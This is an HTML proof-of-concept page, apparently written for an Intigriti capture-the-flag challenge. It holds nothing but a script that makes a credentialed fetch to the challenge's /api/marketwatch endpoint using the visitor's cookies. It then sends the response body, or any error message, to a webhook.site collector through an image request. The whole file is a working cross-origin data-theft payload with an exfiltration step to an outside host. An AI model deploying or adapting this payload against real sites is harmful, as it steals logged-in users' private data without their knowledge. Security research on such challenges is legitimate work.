<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";

(async () => {
  try {
    const res = await fetch(
      "https://challenge-0126.intigriti.io/api/marketwatch",
      { credentials: "include" }
    );

    const text = await res.text();

    new Image().src =
      WEBHOOK +
      "?stage=marketwatch_api_response" +
      "&status=" + res.status +
      "&body=" + encodeURIComponent(text);

  } catch (e) {
    new Image().src =
      WEBHOOK +
      "?stage=marketwatch_api_error&msg=" +
      encodeURIComponent(e.toString());
  }
})();
</script>
</body>
</html>
